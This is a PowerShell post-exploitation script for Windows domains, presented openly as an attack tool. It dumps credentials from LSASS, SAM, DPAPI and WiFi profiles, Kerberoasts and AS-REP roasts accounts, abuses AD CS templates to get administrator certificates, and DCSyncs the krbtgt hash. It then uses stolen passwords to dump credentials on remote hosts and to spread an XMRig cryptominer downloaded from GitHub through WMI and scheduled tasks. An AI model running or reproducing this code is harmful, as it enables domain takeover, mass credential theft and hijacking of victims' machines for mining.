<# 
.SYNOPSIS
    Escalate.ps1 - Privilege Escalation + Credential Harvesting + Domain Dominance
.DESCRIPTION
    Local privesc, Kerberoasting, AD CS abuse, DCSync, credential harvesting
.NOTES
    Run as admin on compromised host. Requires Mimikatz, Rubeus, Certify, Certipy.
#>

param(
    [string]$OutputDir = "C:\ProgramData\MF\Escalate",
    [string]$HitsFile = "C:\ProgramData\MF\Spray\hits.txt"
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

function Log { param([string]$msg) $ts = Get-Date -Format "HH:mm:ss"; Write-Host "[$ts] $msg" }

Log "=== ESCALATE STARTED ==="

# 1. Local Privilege Escalation
Log "[1/8] Local Privilege Escalation..."
try {
    # Token manipulation
    $token = Get-Process -Id $PID | Select-Object -ExpandProperty Handle
    Log "Current token: $token"
    
    # PPL bypass check
    $ppl = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
    if ($ppl) { Log "PPL enabled: $($ppl.RunAsPPL)" }
    
    # AMSI/ETW bypass check
    $amsi = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
    if ($amsi) { Log "AMSI loaded: True" }
} catch { Log "Local privesc check failed: $_" }

# 2. Credential Harvesting (LSASS, SAM, DPAPI, Browser, WiFi)
Log "[2/8] Credential Harvesting..."

function Dump-LSASS {
    Log "Dumping LSASS..."
    $dumpPath = "$OutputDir\lsass.dmp"
    try {
        # Method 1: comsvcs.dll + rundll32
        rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid $dumpPath full 2>&1 | Out-Null
        if (Test-Path $dumpPath) { Log "LSASS dump: $dumpPath" }
    } catch {}
    
    # Method 2: procdump if available
    if (-not (Test-Path $dumpPath)) {
        try { & procdump.exe -accepteula -ma lsass.exe $dumpPath 2>&1 | Out-Null } catch {}
    }
    
    # Parse with sekurlsa (Mimikatz)
    if (Test-Path $dumpPath) {
        $mimiCmd = "sekurlsa::minidump $dumpPath`nsekurlsa::logonpasswords`nsekurlsa::ekeys`nsekurlsa::dpapi"
        $mimiOut = & mimikatz.exe $mimiCmd 2>&1
        $mimiOut | Out-File "$OutputDir\mimikatz_lsass.txt" -Encoding UTF8
        Log "Mimikatz output: $OutputDir\mimikatz_lsass.txt"
    }
}

function Dump-SAM {
    Log "Dumping SAM..."
    $samPath = "$OutputDir\sam.save"
    $sysPath = "$OutputDir\system.save"
    try {
        reg save HKLM\SAM $samPath /y 2>&1 | Out-Null
        reg save HKLM\SYSTEM $sysPath /y 2>&1 | Out-Null
        if (Test-Path $samPath -and Test-Path $sysPath) {
            $mimiCmd = "lsadump::sam /sam:$samPath /system:$sysPath"
            $mimiOut = & mimikatz.exe $mimiCmd 2>&1
            $mimiOut | Out-File "$OutputDir\mimikatz_sam.txt" -Encoding UTF8
            Log "SAM dump complete"
        }
    } catch {}
}

function Dump-DPAPI {
    Log "Dumping DPAPI master keys..."
    $mimiCmd = "sekurlsa::dpapi"
    $mimiOut = & mimikatz.exe $mimiCmd 2>&1
    $mimiOut | Out-File "$OutputDir\mimikatz_dpapi.txt" -Encoding UTF8
    Log "DPAPI dump complete"
}

function Dump-BrowserCreds {
    Log "Dumping browser credentials..."
    $browsers = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
        @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
        @{Name="Firefox"; Path="$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"}
    )
    foreach ($b in $browsers) {
        if ($b.Name -eq "Firefox") {
            $files = Get-ChildItem $b.Path -ErrorAction SilentlyContinue
            foreach ($f in $files) { "$($b.Name): $($f.FullName)" | Out-File "$OutputDir\browser_$($b.Name).txt" -Append -Encoding UTF8 }
        } else {
            if (Test-Path $b.Path) { "$($b.Name): $($b.Path)" | Out-File "$OutputDir\browser_$($b.Name).txt" -Encoding UTF8 }
        }
    }
    Log "Browser creds paths saved"
}

function Dump-WiFi {
    Log "Dumping WiFi profiles..."
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        $key = netsh wlan show profile name="$name" key=clear 2>&1 | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
        "$name|$key" | Out-File "$OutputDir\wifi.txt" -Append -Encoding UTF8
    }
    Log "WiFi profiles dumped"
}

Dump-LSASS
Dump-SAM
Dump-DPAPI
Dump-BrowserCreds
Dump-WiFi

# 3. Kerberoasting
Log "[3/8] Kerberoasting..."
try {
    $spns = setspn -T $env:USERDNSDOMAIN -Q */* 2>&1 | Where-Object { $_ -like "*/*" }
    if ($spns) {
        $spns | Out-File "$OutputDir\spns.txt" -Encoding UTF8
        Log "SPNs found: $($spns.Count)"
        
        # Use Rubeus
        $rubeusOut = & Rubeus.exe kerberoast /outfile:$OutputDir\kerberoast.txt 2>&1
        if ($LASTEXITCODE -eq 0) { Log "Kerberoasting complete: $OutputDir\kerberoast.txt" }
    }
} catch { Log "Kerberoasting failed: $_" }

# 4. AS-REP Roasting
Log "[4/8] AS-REP Roasting..."
try {
    $rubeusOut = & Rubeus.exe asreproast /outfile:$OutputDir\asreproast.txt 2>&1
    if ($LASTEXITCODE -eq 0) { Log "AS-REP roasting complete: $OutputDir\asreproast.txt" }
} catch { Log "AS-REP roasting failed: $_" }

# 5. AD CS Abuse (ESC1-ESC14)
Log "[5/8] AD CS Abuse (ESC1-ESC14)..."
if (Test-Path "C:\ProgramData\MF\Spray\adcs_vuln.txt") {
    $vulns = Get-Content "C:\ProgramData\MF\Spray\adcs_vuln.txt"
    foreach ($v in $vulns) {
        $ca,$template,$vuln = $v.Split("|")
        if ($vuln -in @("ESC1","ESC2","ESC3","ESC4")) {
            Log "Exploiting $vuln on $ca/$template..."
            # Use Certify or Certipy
            try {
                $cmd = "certify.exe request /ca:$ca /template:$template /altname:administrator@$env:USERDNSDOMAIN /machine"
                $result = Invoke-Expression $cmd 2>&1
                if ($result -like "*success*") {
                    Log "AD CS ABUSE SUCCESS: $vuln on $ca/$template" -ForegroundColor Red
                    "$ca|$template|$vuln|DA_CERT" | Out-File "$OutputDir\adcs_success.txt" -Append -Encoding UTF8
                }
            } catch { Log "Certify failed: $_" }
            
            # Certipy fallback
            try {
                $cmd = "certipy req -ca $ca -template $template -upn administrator@$env:USERDNSDOMAIN -dc-ip $env:LOGONSERVER"
                $result = Invoke-Expression $cmd 2>&1
                if ($result -like "*success*") {
                    Log "Certipy SUCCESS: $vuln on $ca/$template" -ForegroundColor Red
                }
            } catch { Log "Certipy failed: $_" }
        }
    }
}

# 6. DCSync / DCSHadow
Log "[6/8] DCSync / DCShadow..."
try {
    $mimiCmd = "lsadump::dcsync /domain:$env:USERDNSDOMAIN /user:krbtgt"
    $mimiOut = & mimikatz.exe $mimiCmd 2>&1
    $mimiOut | Out-File "$OutputDir\mimikatz_dcsync.txt" -Encoding UTF8
    if ($mimiOut -like "*krbtgt*") { Log "DCSync SUCCESS: krbtgt hash dumped" -ForegroundColor Red }
} catch { Log "DCSync failed: $_" }

# 7. Credential Harvesting from Hits
Log "[7/8] Processing hits..."
if (Test-Path "C:\ProgramData\MF\Spray\hits.txt") {
    $hits = Get-Content "C:\ProgramData\MF\Spray\hits.txt"
    foreach ($line in $hits) {
        $ip,$user,$pass,$proto = $line.Split("|")
        Log "Processing hit: $ip | $user | $proto"
        
        # Try to get shell and dump more creds
        $sec = ConvertTo-SecureString $pass -AsPlainText -Force
        $cred = New-Object PSCredential $user, $sec
        
        try {
            $sess = New-PSSession -ComputerName $ip -Credential $cred -ErrorAction Stop
            Invoke-Command -Session $sess -ScriptBlock {
                param($outDir)
                # Dump local creds on remote
                rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid $env:TEMP\lsass.dmp full
                & mimikatz.exe "sekurlsa::minidump $env:TEMP\lsass.dmp" "sekurlsa::logonpasswords" "exit" | Out-File "$outDir\remote_$env:COMPUTERNAME.txt" -Encoding UTF8
            } -ArgumentList $OutputDir
            Remove-PSSession $sess
            Log "Remote dump complete: $ip"
        } catch { Log "Remote dump failed on $ip: $_" }
    }
}

# 8. Lateral Movement + Auto-Deploy
Log "[8/8] Lateral Movement + Auto-Deploy..."
if (Test-Path "$OutputDir\admin_creds.txt") {
    $adminCreds = Get-Content "$OutputDir\admin_creds.txt"
    foreach ($line in $adminCreds) {
        $ip,$user,$pass = $line.Split("|")
        $sec = ConvertTo-SecureString $pass -AsPlainText -Force
        $cred = New-Object PSCredential $user, $sec
        
        $deployCmd = "powershell -c `\"iwr https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip -o `\$env:TEMP\xmrig.zip; Expand-Archive `\$env:TEMP\xmrig.zip` `\$env:TEMP\xmrig` -Force; \$exe = gci `\$env:TEMP\xmrig` -r -filter xmrig.exe | select -first 1; & \$exe.FullName -o gulf.moneroocean.stream:10001 -u YOUR_WALLET -p \$env:COMPUTERNAME -k --donate-level 1`\""
        
        # Deploy via WMI
        try { Invoke-WmiMethod -ComputerName $ip -Credential $cred -Class Win32_Process -Name Create -Arguments "cmd /c $deployCmd"; Log "Deployed via WMI: $ip" } catch {}
        
        # Deploy via Scheduled Task
        try { $tn="SysUpd"+(Get-Random); cmd /c "schtasks /create /s $ip /u $user /p $pass /tn $tn /tr \"cmd /c $deployCmd\" /sc once /st 00:00 /ru System /f"; cmd /c "schtasks /run /s $ip /tn $tn /u $user /p $pass"; Start-Sleep 2; cmd /c "schtasks /delete /s $ip /tn $tn /f"; Log "Deployed via Task: $ip" } catch {}
    }
}

Log "=== ESCALATE COMPLETE ==="
Log "Outputs: $OutputDir\*"
Log "Check: mimikatz_lsass.txt, kerberoast.txt, asreproast.txt, adcs_success.txt, dcsync.txt"